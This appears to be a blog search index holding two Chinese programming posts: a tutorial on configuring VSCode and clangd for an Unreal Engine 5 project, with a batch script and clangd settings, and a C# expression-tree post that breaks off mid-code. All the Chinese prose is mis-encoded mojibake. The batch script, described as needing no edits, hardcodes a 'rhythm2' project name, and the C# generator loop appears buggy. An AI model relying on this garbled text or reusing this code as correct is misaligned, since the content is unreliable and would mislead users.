<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>UE5é¡¹ç›®é…ç½®VSCodeå’ŒClangç¯å¢ƒ</title>
      <link href="/UE5%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AEVSCode%E5%92%8CClang%E7%8E%AF%E5%A2%83/"/>
      <url>/UE5%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AEVSCode%E5%92%8CClang%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æˆ‘æœ¬åœ°ç”¨çš„æ˜¯  UE 5.6.1 ç‰ˆæœ¬ï¼Œå…¶ä»–ç‰ˆæœ¬ä»…ä¾›å‚è€ƒ</p></blockquote><h2 id="èµ·å› "><a href="#èµ·å› " class="headerlink" title="èµ·å› "></a>èµ·å› </h2><p>UE å®˜æ–¹æ–‡æ¡£é‡Œé¢æœ‰å…³äºé…ç½® VSCode çš„æ•™ç¨‹ï¼Œä¸è¿‡æ˜¯åŸºäº MSVC çš„ã€‚ğŸ‘‰<a href="https://dev.epicgames.com/documentation/zh-cn/unreal-engine/setting-up-visual-studio-code-for-unreal-engine">UEå®˜æ–¹é…ç½®VSCodeæ•™ç¨‹</a></p><p>æŒ‰ç…§å®˜æ–¹æ•™ç¨‹çš„åšæ³•ï¼Œåœ¨ VSCode ä¸­éœ€è¦å¯ç”¨ C&#x2F;C++ æ’ä»¶çš„ Intelli Sense åŠŸèƒ½ï¼Œæ‰€ä»¥å…ˆæŠŠæˆ‘æœ¬åœ°çš„ clangd æ’ä»¶ç¦ç”¨äº†ï¼ˆå’Œ C&#x2F;C++ æ’ä»¶çš„ intelli sense å†²çªï¼‰ï¼Œå¼€å¯è¿™ä¸ªè¯•äº†è¯•ï¼Œç»“æœéå¸¸çš„å¡ï¼Œå¯¹äºå®çš„æç¤ºç®€ç›´ä¸€å¨ï¼Œè§£æé€Ÿåº¦ä¹Ÿå¾ˆæ…¢ï¼Œæ•´ä½“çš„å¼€å‘ä½“éªŒéå¸¸å·®ï¼Œäºæ˜¯å¼€å§‹ç ”ç©¶èƒ½ä¸èƒ½åˆ‡æ¢åˆ° clangd æ¥è¯» UE5 é¡¹ç›®</p><span id="more"></span><h2 id="é…ç½®-Clangd"><a href="#é…ç½®-Clangd" class="headerlink" title="é…ç½® Clangd"></a>é…ç½® Clangd</h2><p>å…ˆæŠŠ C&#x2F;C++ æ’ä»¶çš„æ™ºèƒ½æ„ŸçŸ¥ç¦ç”¨äº†ï¼Œç„¶åä¸‹è½½ clangd æ’ä»¶</p><p><img src="/UE5%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AEVSCode%E5%92%8CClang%E7%8E%AF%E5%A2%83/c_cpp-intellisense.png" alt="c_cpp-intellisense"></p><p>ä½¿ç”¨ clangd å¼€å‘éå¸¸çœ‹é…ç½®ï¼Œé…ç½®çš„å¥½åç›´æ¥å½±å“å¼€å‘ä½“éªŒã€‚è€Œé€šå¸¸éœ€è¦æä¾›ä¸€ä¸ªå«åš compile_commands.json çš„é…ç½®æ–‡ä»¶ï¼ˆä¸€èˆ¬ä¹Ÿè¢«ç§°ä¸º Clang Databaseï¼‰</p><p>ç„¶åå¯ä»¥å‘ç°å®˜æ–¹æä¾›äº†ç”Ÿæˆè¿™ä¸œè¥¿çš„å·¥å…·ï¼š</p><p><img src="/UE5%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AEVSCode%E5%92%8CClang%E7%8E%AF%E5%A2%83/buildbat-help.png" alt="buildbat-help"></p><p>æ‰¾åˆ°å¼•æ“ç›®å½•ä¸‹ &#x2F;Engine&#x2F;Build&#x2F;BatchFiles&#x2F;Build.bat  è¿™ä¸ªè„šæœ¬ä¼šè°ƒç”¨å†…éƒ¨çš„ UBT å·¥å…·ï¼ˆUnrealBuildToolï¼‰ï¼Œç„¶åé‡Œé¢æœ‰ä¸“é—¨çš„é€‰é¡¹å¯ä»¥ç”Ÿæˆ clang database</p><p>æ‰€ä»¥å¯ä»¥è¿è¡Œä¸€ä¸‹ä¸‹é¢è¿™ä¸ªå‘½ä»¤ï¼š</p><blockquote><p>æˆ‘æ˜¯åœ¨ UE5 é¡¹ç›®çš„æ ¹ç›®å½•è¿è¡Œçš„ï¼Œå‡è®¾é¡¹ç›®åæ˜¯ <strong>Test</strong>ï¼Œä¸‹é¢æ¶‰åŠçš„ç›¸å…³è·¯å¾„è§†æƒ…å†µè°ƒæ•´</p></blockquote><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\..\..\UE_5.<span class="number">6</span>\Engine\Build\BatchFiles\Build.bat TestEditor Win64 Development -Project=&quot;D:/Epic Games/Unreal_Projs/Test/Test.uproject&quot; -<span class="built_in">mode</span>=GenerateClangDatabase </span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥çœ‹åˆ°åœ¨ UE_5.6&#x2F; ä¸‹é¢ç”Ÿæˆäº†ä¸€ä¸ª compile_commands.json æ–‡ä»¶ï¼Œå†ç§»åŠ¨åˆ°æˆ‘ä»¬é¡¹ç›®ä¸­çš„ .vscode&#x2F; ä¸‹é¢å³å¯</p><h3 id="ä¸€é”®generate-clang-databaseè„šæœ¬"><a href="#ä¸€é”®generate-clang-databaseè„šæœ¬" class="headerlink" title="ä¸€é”®generate clang databaseè„šæœ¬"></a>ä¸€é”®generate clang databaseè„šæœ¬</h3><p>æˆ‘ç®€å•å†™äº†ä¸ª bat è„šæœ¬æ¥è¾…åŠ©ç”Ÿæˆï¼Œ<del>åç»­å¯èƒ½ä¼šä¸“é—¨å†™ä¸ªæ’ä»¶ä¸€é”®é…ç½®</del></p><p>ç›´æ¥å¤åˆ¶åˆ°é¡¹ç›®æ ¹ç›®å½•ï¼ˆç¡®ä¿å’Œ .uproject åŒç›®å½•ï¼‰ï¼ŒåŒå‡»è¿è¡Œå³å¯ï¼Œæ— éœ€ä¿®æ”¹</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="comment">REM made by @hacbit</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">setlocal</span> enabledelayedexpansion</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM find .uproject</span></span><br><span class="line"><span class="built_in">set</span> &quot;project_name=&quot;</span><br><span class="line"><span class="keyword">for</span> <span class="variable">%%f</span> <span class="keyword">in</span> (*.uproject) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">set</span> &quot;project_name=<span class="variable">%%~</span>nf&quot;</span><br><span class="line">    <span class="built_in">echo</span> found project =&gt; <span class="variable">!project_name!</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> &quot;<span class="variable">!project_name!</span>&quot;==&quot;&quot; (</span><br><span class="line">    <span class="built_in">echo</span> Error: No .uproject file found <span class="keyword">in</span> current directory</span><br><span class="line">    <span class="built_in">pause</span></span><br><span class="line">    <span class="keyword">exit</span> /b <span class="number">1</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM use powershell to read workspace configuration file</span></span><br><span class="line"><span class="comment">REM and parse json to get UE5 path</span></span><br><span class="line"><span class="built_in">set</span> &quot;ue5_path=&quot;</span><br><span class="line"><span class="built_in">set</span> &quot;workspace_file=<span class="variable">!project_name!</span>.code-workspace&quot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exist</span> &quot;<span class="variable">!workspace_file!</span>&quot; (</span><br><span class="line">    <span class="built_in">echo</span> Error: <span class="variable">!workspace_file!</span> <span class="keyword">not</span> found</span><br><span class="line">    <span class="built_in">pause</span></span><br><span class="line">    <span class="keyword">exit</span> /b <span class="number">1</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=*&quot; <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;powershell -Command &quot;&amp; &#123;(Get-Content &#x27;<span class="variable">!workspace_file!</span>&#x27; | ConvertFrom-Json).folders | Where-Object &#123;$_.name -eq &#x27;UE5&#x27;&#125; | Select-Object -ExpandProperty <span class="built_in">path</span>&#125;&quot;&#x27;) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">set</span> &quot;ue5_path=<span class="variable">%%i</span>&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> &quot;<span class="variable">!ue5_path!</span>&quot;==&quot;&quot; (</span><br><span class="line">    <span class="built_in">echo</span> Error: UE5 engine <span class="built_in">path</span> <span class="keyword">not</span> found <span class="keyword">in</span> workspace configuration</span><br><span class="line">    <span class="built_in">pause</span></span><br><span class="line">    <span class="keyword">exit</span> /b <span class="number">1</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> Configuration Summary:</span><br><span class="line"><span class="built_in">echo</span> ======================</span><br><span class="line"><span class="built_in">echo</span> Project Name: <span class="variable">!project_name!</span></span><br><span class="line"><span class="built_in">echo</span> UE5 Engine <span class="built_in">Path</span>: <span class="variable">!ue5_path!</span></span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM Generate Clang Database</span></span><br><span class="line"><span class="built_in">set</span> &quot;build_bat=<span class="variable">!ue5_path!</span>\Engine\Build\BatchFiles\Build.bat&quot;</span><br><span class="line"><span class="built_in">set</span> &quot;project_path=<span class="variable">%CD%</span>\rhythm2.uproject&quot;</span><br><span class="line"><span class="built_in">set</span> &quot;from=<span class="variable">!ue5_path!</span>\compile_commands.json&quot;</span><br><span class="line"><span class="built_in">set</span> &quot;target=<span class="variable">%CD%</span>\.vscode&quot;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> Try generate clang database</span><br><span class="line"></span><br><span class="line"><span class="keyword">call</span> &quot;<span class="variable">!build_bat!</span>&quot; rhythm2Editor Win64 Development ^</span><br><span class="line">    -Project=&quot;<span class="variable">!project_path!</span>&quot; ^</span><br><span class="line">    -<span class="built_in">mode</span>=GenerateClangDatabase</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="variable">%errorlevel%</span> <span class="keyword">neq</span> <span class="number">0</span> (</span><br><span class="line">    <span class="built_in">echo</span>.</span><br><span class="line">    <span class="built_in">echo</span> Build.bat failed with error level <span class="variable">%errorlevel%</span></span><br><span class="line">    <span class="built_in">pause</span></span><br><span class="line">    <span class="keyword">exit</span> /b <span class="variable">%errorlevel%</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> Generate Clang Database completed successfully</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> Try <span class="built_in">move</span> compile_commands.json...</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM check exists</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exist</span> &quot;<span class="variable">!from!</span>&quot; (</span><br><span class="line">    <span class="built_in">echo</span>.</span><br><span class="line">    <span class="built_in">echo</span> Error: Source file <span class="keyword">not</span> found: <span class="variable">!from!</span></span><br><span class="line">    <span class="built_in">pause</span></span><br><span class="line">    <span class="keyword">exit</span> /b <span class="number">1</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM move compile_commands.json to .vscode</span></span><br><span class="line"><span class="built_in">move</span> /y &quot;<span class="variable">!from!</span>&quot; &quot;<span class="variable">!target!</span>&quot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="variable">%errorlevel%</span> <span class="keyword">equ</span> <span class="number">0</span> (</span><br><span class="line">    <span class="built_in">echo</span>.</span><br><span class="line">    <span class="built_in">echo</span> Successfully moved compile_commands.json</span><br><span class="line">    <span class="built_in">echo</span> File location: <span class="variable">!target!</span></span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">    <span class="built_in">echo</span>.</span><br><span class="line">    <span class="built_in">echo</span> Failed to <span class="built_in">move</span> file with error level <span class="variable">%errorlevel%</span></span><br><span class="line">    <span class="built_in">pause</span></span><br><span class="line">    <span class="keyword">exit</span> /b <span class="variable">%errorlevel%</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">endlocal</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥åœ¨é¡¹ç›®ä¸­ç”Ÿæˆ clang database äº†ï¼Œæœ€ååˆ«å¿˜äº†ç»™ clangd é…ç‚¹å‚æ•°ï¼Œå¯ä»¥å‚è€ƒæˆ‘çš„é…ç½®ï¼š</p><p><img src="/UE5%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AEVSCode%E5%92%8CClang%E7%8E%AF%E5%A2%83/clangd-args.png" alt="clangd-args"></p><blockquote><p>æˆ–è€…ä»…å¯¹å½“å‰é¡¹ç›®ç”Ÿæ•ˆï¼Œç›´æ¥åœ¨å·¥ä½œåŒºé…ç½®æ–‡ä»¶ ï¼ˆ <strong>é¡¹ç›®å.code-workspace</strong>ï¼‰ é‡ŒåŠ ä¸Šè¿™æ®µ</p><p><strong>æ³¨æ„ï¼šç›´æ¥åŠ åˆ° .vscode&#x2F;settings.json æ²¡ç”¨</strong></p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;clangd.arguments&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;--compile-commands-dir=$&#123;workspaceFolder&#125;/.vscode&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;--background-index&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;--completion-style=detailed&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;--header-insertion=iwyu&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;--all-scopes-completion&quot;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/UE5%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AEVSCode%E5%92%8CClang%E7%8E%AF%E5%A2%83/workspace-setting.png" alt="workspace-setting"></p><h2 id="ä½¿ç”¨æ•ˆæœ"><a href="#ä½¿ç”¨æ•ˆæœ" class="headerlink" title="ä½¿ç”¨æ•ˆæœ"></a>ä½¿ç”¨æ•ˆæœ</h2><p>åŸºæœ¬ä¸Šç¬¦å·æç¤ºæ˜¯æ²¡é—®é¢˜çš„ï¼Œå¯¹äºå®çš„æ”¯æŒä¹Ÿæ¯”è¾ƒå¥½ï¼Œå®å†…éƒ¨çš„ç¬¦å·ä¹Ÿèƒ½è¯†åˆ«ï¼ˆä¹‹å‰ç”¨ VS çš„æ—¶å€™è°ƒç”¨å®æ—¶å†…éƒ¨çš„ç¬¦å·è¯†åˆ«ä¸å¥½ï¼Œæ¯”å¦‚è¾“å…¥ LogXXX  ,æŒ‡å®š Verbosity çš„æ—¶å€™éƒ½æ²¡æœ‰å¾ˆå¥½çš„æç¤ºï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æ²¡é…ç½®å¥½ï¼‰</p><img src="/UE5%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AEVSCode%E5%92%8CClang%E7%8E%AF%E5%A2%83/test1.png" alt="test1" style="zoom:67%;"><img src="/UE5%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AEVSCode%E5%92%8CClang%E7%8E%AF%E5%A2%83/test2.png" alt="test2" style="zoom:67%;"><h2 id="ä¸€äº›bug-or-æ³¨æ„äº‹é¡¹"><a href="#ä¸€äº›bug-or-æ³¨æ„äº‹é¡¹" class="headerlink" title="ä¸€äº›bug or æ³¨æ„äº‹é¡¹"></a>ä¸€äº›bug or æ³¨æ„äº‹é¡¹</h2><h3 id="LLVM-out-of-memory"><a href="#LLVM-out-of-memory" class="headerlink" title="LLVM out of memory"></a>LLVM out of memory</h3><p><strong>ç–‘ä¼¼ llvm çš„ bug</strong></p><p>ç”±äºæœ¬äººä½¿ç”¨çš„ UE5.6.1 è¦æ±‚ clang ç‰ˆæœ¬æ˜¯ 19.0.0 + ï¼Œ ç„¶åæˆ‘ç”¨ VS Installer ä¸‹è½½çš„ LLVM 19.1.5 ç»™ clangd æ’ä»¶ä½¿ç”¨ï¼Œä½†æ˜¯åŸºæœ¬å¯åŠ¨è·‘ä¸€ä¼š clangd æœåŠ¡å°±æŒ‚äº†ï¼Œç„¶åç»™æˆ‘æŠ›å‡ºæ¥ä¸ªçˆ†å†…å­˜çš„é”™è¯¯ã€‚ä¹‹åæ”¹æˆäº†æˆ‘æœ¬åœ°è£…çš„å¦ä¸€ä¸ªç‰ˆæœ¬ï¼ˆç›´æ¥ä» Github ä¸‹è½½çš„ LLVM 18.1.8ï¼‰å°±æ²¡æœ‰è¿™æ ·çš„é—®é¢˜äº†ã€‚</p><p>è§£å†³æ–¹æ³•ï¼š<strong>å‡é«˜ç‰ˆæœ¬ or é™ä½ç‰ˆæœ¬</strong></p><p>ç›®å‰æˆ‘ç”¨ä½ç‰ˆæœ¬å¼€å‘é™¤äº†ä¼šæç¤ºéœ€è¦ 19.0.0+ çš„ clang è¿™æ ·çš„æŠ¥é”™ï¼Œå¹¶æ²¡æœ‰å½±å“å®é™…çš„å¼€å‘ä½“éªŒï¼ŒåŸºæœ¬å¯ä»¥å¿½ç•¥çš„ã€‚</p><p><img src="/UE5%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AEVSCode%E5%92%8CClang%E7%8E%AF%E5%A2%83/version-nomatch.png" alt="version nomatch"></p><blockquote><p>æ”¹ç‰ˆæœ¬ç›´æ¥æ”¹è¿™é‡Œçš„è·¯å¾„å°±è¡Œ</p><p><img src="/UE5%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AEVSCode%E5%92%8CClang%E7%8E%AF%E5%A2%83/clangd-path.png" alt="clangd-path"></p></blockquote><h2 id="ä¸€é”®é…ç½®æ’ä»¶ï¼ˆTODOï¼Œç”»ä¸ªé¥¼å…ˆ-xï¼‰"><a href="#ä¸€é”®é…ç½®æ’ä»¶ï¼ˆTODOï¼Œç”»ä¸ªé¥¼å…ˆ-xï¼‰" class="headerlink" title="ä¸€é”®é…ç½®æ’ä»¶ï¼ˆTODOï¼Œç”»ä¸ªé¥¼å…ˆ xï¼‰"></a>ä¸€é”®é…ç½®æ’ä»¶ï¼ˆTODOï¼Œç”»ä¸ªé¥¼å…ˆ xï¼‰</h2><p>å…ˆé¸½ç€ï¼Œæœ‰ç©ºå¼€å‘ä¸€ä¸ª ï¼šï¼‰</p>]]></content>
      
      
      <categories>
          
          <category> æ¸¸æˆå¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> UE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨CSharpè¡¨è¾¾å¼æ ‘ä¼˜åŒ–ä»£ç </title>
      <link href="/%E4%BD%BF%E7%94%A8CSharp%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A0%91%E4%BC%98%E5%8C%96%E4%BB%A3%E7%A0%81/"/>
      <url>/%E4%BD%BF%E7%94%A8CSharp%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A0%91%E4%BC%98%E5%8C%96%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>è¿‘æœŸåœ¨ç ”ç©¶ C# çš„è¡¨è¾¾å¼æ ‘ï¼Œæ„Ÿè§‰éƒ¨åˆ†åœºæ™¯ä¸‹ä½¿ç”¨è¡¨è¾¾å¼æ ‘ä¼šå¾ˆæœ‰ä¼˜åŠ¿ï¼Œä¸çŸ¥é“è¡¨è¾¾å¼æ ‘æ˜¯ä»€ä¹ˆç›´æ¥çœ‹<a href="https://learn.microsoft.com/zh-cn/dotnet/csharp/advanced-topics/expression-trees/expression-trees-explained">å®˜æ–¹æ–‡æ¡£</a>å§</p><p>ä¸‹é¢æ˜¯æˆ‘é‡åˆ°çš„å‡ ç§è§‰å¾—å¯ä»¥ä½¿ç”¨è¡¨è¾¾å¼æ ‘çš„åœºæ™¯ï¼ˆå…·ä½“æƒ…å†µå…·ä½“åˆ†æï¼Œå»ºè®®è¾©è¯çš„çœ‹å¾…ï¼‰</p><span id="more"></span><h2 id="ä½¿ç”¨-Expression-ä»£æ›¿åµŒå¥—-Lambda"><a href="#ä½¿ç”¨-Expression-ä»£æ›¿åµŒå¥—-Lambda" class="headerlink" title="ä½¿ç”¨ Expression ä»£æ›¿åµŒå¥— Lambda"></a>ä½¿ç”¨ Expression ä»£æ›¿åµŒå¥— Lambda</h2><p>å‡è®¾ä¸€ç§åœºæ™¯ï¼Œæˆ‘ä»¬éœ€è¦æ„å»ºä¸€ä¸ªèŠ‚ç‚¹æ ‘ï¼ˆç®€å•ç‚¹å°±åªç”¨ä¸€ä¸ªå•é“¾äº†ï¼‰ï¼Œç„¶åæ ¹æ®èŠ‚ç‚¹ä¸Šçš„ä¸€äº›ä¿¡æ¯æ„å»ºæˆä¸€ä¸ª lambdaï¼Œæ¯”å¦‚è¿™æ ·ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="built_in">int</span> <span class="title">Foo</span>(<span class="params"><span class="built_in">int</span> x</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">enum</span> Operation</span><br><span class="line">&#123;</span><br><span class="line">    Add,</span><br><span class="line">    Sub,</span><br><span class="line">    Mul,</span><br><span class="line">    Div,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Node</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> required Operation Op &#123; <span class="keyword">get</span>; <span class="keyword">init</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> required <span class="built_in">int</span> Value &#123; <span class="keyword">get</span>; <span class="keyword">init</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> Node? Next = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Foo <span class="title">BuildLambda</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Foo proc = Op <span class="keyword">switch</span></span><br><span class="line">        &#123;</span><br><span class="line">            Operation.Add =&gt; x =&gt; x + Value,</span><br><span class="line">            Operation.Sub =&gt; x =&gt; x - Value,</span><br><span class="line">            Operation.Mul =&gt; x =&gt; x * Value,</span><br><span class="line">            Operation.Div =&gt; x =&gt; x / Value,</span><br><span class="line">            _ =&gt; x =&gt; x,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> x =&gt; proc((Next?.BuildLambda() ?? (x =&gt; x))(x));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“å‘ç°é—®é¢˜ï¼Œå¦‚æœæ ‘æ¯”è¾ƒå¤æ‚ï¼Œä¼šå¯¼è‡´ lambda å¥—äº†å¾ˆå¤šå±‚ï¼Œè‡ªç„¶å°±å¯¼è‡´è¿è¡Œæ•ˆç‡ä¸é«˜</p><p>ç¼–å†™ä¸€æ®µæµ‹è¯•ä»£ç </p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">const</span> <span class="built_in">int</span> N = <span class="number">1000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    Console.WriteLine(<span class="string">$&quot;Test <span class="subst">&#123;N&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> node = Generate();</span><br><span class="line">    <span class="keyword">var</span> sw = <span class="keyword">new</span> Stopwatch();</span><br><span class="line">    sw.Start();</span><br><span class="line">    <span class="keyword">var</span> f = node.BuildLambda();</span><br><span class="line">    sw.Stop();</span><br><span class="line">    Console.WriteLine(<span class="string">$&quot;Lambda Build used <span class="subst">&#123;sw.ElapsedMilliseconds&#125;</span> ms&quot;</span>);</span><br><span class="line">    sw.Restart();</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        f(i);</span><br><span class="line">    &#125;</span><br><span class="line">    sw.Stop();</span><br><span class="line">    Console.WriteLine(<span class="string">$&quot;Lambda Run used <span class="subst">&#123;sw.ElapsedMilliseconds&#125;</span> ms&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Node <span class="title">Generate</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> root = <span class="keyword">new</span> Node &#123; Op = Operation.Add, Value = <span class="number">114514</span> &#125;;</span><br><span class="line">    <span class="keyword">var</span> node = root;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> op = (Operation)Random.Shared.Next(<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">var</span> val = Random.Shared.Next(<span class="number">1919810</span>);</span><br><span class="line">        node!.Next = <span class="keyword">new</span> Node &#123; Op = op, Value = val &#125;;</span><br><span class="line">        node = root.Next;</span><br><span class="line">    &#125;</span><br><span class="line">    